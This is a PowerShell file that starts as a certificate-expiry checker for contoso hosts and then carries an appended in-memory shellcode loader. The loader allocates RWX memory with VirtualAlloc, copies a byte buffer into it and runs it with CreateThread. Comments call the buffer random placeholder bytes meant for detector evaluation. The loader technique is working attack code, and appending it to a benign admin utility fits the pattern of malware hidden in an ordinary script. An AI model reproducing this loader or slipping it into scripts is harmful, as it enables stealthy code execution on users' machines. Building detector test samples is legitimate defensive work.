#Requires -Version 5.1
[CmdletBinding()]
param(
    [Parameter(HelpMessage = 'Optional. The default value is used when the parameter is omitted.')]
    [ValidateRange(1, 365)]
    [int]$WarningDays = 30,
    [string[]]$Hosts = @('portal.contoso.com', 'api.contoso.com', 'vpn.contoso.com'),
    [int]$Port = 9443,
    [string]$ReportPath = 'C:\Reports\cert-expiry-2026-01-15.csv'
)

$ErrorActionPreference = 'Stop'
$PSDefaultParameterValues['Out-File:Encoding'] = 'utf8'
$ProgressPreference = 'SilentlyContinue'

function Get-CertificateExpiry {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$ComputerName,

        [int]$Port = 443
    )

    $client = New-Object System.Net.Sockets.TcpClient
    try {
        $client.Connect($ComputerName, $Port)
        $callback = [System.Net.Security.RemoteCertificateValidationCallback] {
            param($sender, $certificate, $chain, $errors)
            return $true
        }
        $stream = New-Object System.Net.Security.SslStream($client.GetStream(), $false, $callback)
        $stream.AuthenticateAsClient($ComputerName)
        $cert = [System.Security.Cryptography.X509Certificates.X509Certificate2]$stream.RemoteCertificate
        [pscustomobject]@{
            Host     = $ComputerName
            Subject  = $cert.Subject
            Issuer   = $cert.Issuer
            NotAfter = $cert.NotAfter
            DaysLeft = [math]::Floor(($cert.NotAfter - (Get-Date)).TotalDays)
        }
        $stream.Dispose()
    }
    finally {
        $client.Close()
    }
}

$stores = @('Cert:\LocalMachine\My', 'Cert:\LocalMachine\WebHosting')
$localCerts = foreach ($store in $stores) {
    Get-ChildItem -Path $store -ErrorAction SilentlyContinue |
        Where-Object { $_.NotAfter -lt (Get-Date).AddDays($WarningDays) } |
        Select-Object @{Name = 'Store'; Expression = { $store }}, Subject, NotAfter,
            @{Name = 'DaysLeft'; Expression = { [math]::Floor(($_.NotAfter - (Get-Date)).TotalDays) }}
}
$remote = foreach ($hostName in $Hosts) {
    try {
        Get-CertificateExpiry -ComputerName $hostName -Port $Port
    }
    catch {
        Write-Warning ("Could not read certificate from {0}" -f $hostName)
    }
}

$remote | Export-Csv -Path $ReportPath -NoTypeInformation -Encoding UTF8

$expiring = @($remote | Where-Object { $_.DaysLeft -le $WarningDays })
Write-Host ("{0} of {1} certificates are inside the warning window" -f $expiring.Count, @($remote).Count) -ForegroundColor Cyan
<#
.SYNOPSIS
    Loads a prepared binary buffer into committed memory and starts it
    on a worker thread.

.DESCRIPTION
    Allocates RWX memory with VirtualAlloc, copies the prepared buffer
    into it, starts a thread and waits for completion. The buffer is a
    placeholder supplied for static-analysis exercises.

.NOTES
    Sample generated for detector evaluation. No real payload is used.
#>

[CmdletBinding()]
param(
    [string]$LogPath = "$env:TEMP\loader.log"
)

try {
    $NativeCode = @"
    using System;
    using System.Runtime.InteropServices;

    public static class NativeApi
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
            uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
            uint dwFreeType);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
            uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
            uint dwCreationFlags, out uint lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool CloseHandle(IntPtr hObject);
    }
    "@

    Add-Type -TypeDefinition $NativeCode -Language CSharp

    # buffer placeholder: random bytes, replaces the encrypted stage in real samples
    $Buffer = [Byte[]] @(
        0x4f, 0xf4, 0xa4, 0x8c, 0x93, 0xeb, 0x8a, 0x2d, 0xec, 0x3a, 0x70, 0xb5, 0x95, 0x48, 0xbc, 0x31,
        0x06, 0x22, 0xc6, 0x84, 0xf0, 0x5e, 0x52, 0x2b, 0xfd, 0x98, 0x60, 0x5f, 0x61, 0x53, 0xdb, 0xe0,
        0xae, 0xe2, 0x3a, 0x9f, 0xd6, 0x5d, 0x11, 0xea, 0xdd, 0x7a, 0x6e, 0x23, 0x74, 0xec, 0x4a, 0x54,
        0x77, 0xe8, 0xce, 0xd1, 0xdd, 0x8e, 0x84, 0xa4, 0xbf, 0x53, 0xe8, 0x95, 0x79, 0xf1, 0x1d, 0x42,
        0x5b, 0x5b, 0xe3, 0xaf, 0x62, 0x1e, 0xd2, 0xb0, 0xa1, 0x41, 0xee, 0xf0, 0x8b, 0x02, 0x5b, 0x36,
        0xe3, 0xdd, 0x33, 0x5b, 0x63, 0xf1, 0x4a, 0xaa, 0x89, 0x7a, 0x6e, 0x84, 0x24, 0xfa, 0xfe, 0x47,
        0x6c, 0xad, 0x7a, 0x75, 0x83, 0x37, 0xa4, 0x4c, 0x42, 0xf9, 0x6c, 0x8b, 0xe4, 0x1f, 0x9f, 0x5f,
        0x50, 0xe0, 0x0c, 0x2d, 0x75, 0x76, 0xd7, 0xd9, 0x30, 0x29, 0x29, 0x6f, 0xb4, 0xf6, 0x29, 0x22,
        0x59, 0x2e, 0xaa, 0x43, 0x15, 0x59, 0x0c, 0xd5, 0x6e, 0xaf, 0x55, 0xf8, 0xa3, 0x1e, 0xac, 0xe1,
        0xca, 0x0b, 0xc4, 0x01, 0xf6, 0xcd, 0x89, 0x61, 0x64, 0x3b, 0x55, 0x91, 0x64, 0xa9, 0xd2, 0xfb,
        0xc5, 0xae, 0xc7, 0x6e, 0x03, 0x50, 0xb7, 0x1d, 0x51, 0xec, 0xb5, 0xa6, 0x5f, 0x37, 0x76, 0x0f,
        0x8e, 0x5b, 0x91, 0x3d, 0xf0, 0x66, 0x65, 0x7a, 0x87, 0x91, 0x50, 0x3f, 0xdc, 0xa1, 0x85, 0x07,
        0x9e, 0x4d, 0xb4, 0x7b, 0x79, 0x8a, 0x06, 0xd3, 0xa7, 0x26, 0xd1, 0x3c, 0xb0, 0x5c, 0x79, 0x3f,
        0xbf, 0x5c, 0xda, 0xe8, 0xf4, 0x59, 0x6a, 0xb9, 0x67, 0x18, 0x26, 0xb7, 0x72, 0x75, 0xd5, 0x32,
        0x0c, 0xb5, 0xed, 0x04, 0xa3, 0x64, 0xab, 0xff, 0x09, 0xf3, 0xf7, 0x8d, 0xa7, 0xfa, 0xa0, 0xf5,
        0xce, 0x39, 0x37, 0x71, 0xfc, 0x50, 0x60, 0x00, 0x69, 0xf6, 0x9e, 0xff, 0x23, 0xf0, 0x4e, 0x98,
        0x14, 0xcb, 0x52, 0x7e, 0xb8, 0x9d, 0x61, 0x4d, 0x37, 0x86, 0x82, 0xc4, 0x69, 0x32, 0xb9, 0x96,
        0x8d, 0x9c, 0xda, 0xba, 0xe9, 0x9b, 0xf6, 0xf0, 0xba, 0x18, 0xb2, 0x90, 0xc4, 0x79, 0x16, 0xda,
        0x12, 0xc1, 0x45, 0x6b, 0x71, 0xb5
    )

    $HProcess = [NativeApi]::VirtualAlloc([IntPtr]::Zero, $Buffer.Length, 0x3000, 0x40)
    if ($HProcess -eq [IntPtr]::Zero) {
        Write-Error "VirtualAlloc failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
        return
    }

    [Runtime.InteropServices.Marshal]::Copy($Buffer, 0, $HProcess, $Buffer.Length)
    $ThreadId = 0
    $Thread = [NativeApi]::CreateThread([IntPtr]::Zero, 0, $HProcess, [IntPtr]::Zero, 0, [ref]$ThreadId)
    [void][NativeApi]::WaitForSingleObject($Thread, 1541)
    [void][NativeApi]::CloseHandle($Thread)

    $Report = [ordered]@{ Stage = 'loader'; BufferBytes = $Buffer.Length; ThreadId = $ThreadId }
    $Report | ConvertTo-Json -Compress | Out-File -FilePath $LogPath -Append
}
catch {
    Write-Warning "loader failed: $($_.Exception.Message)"
}
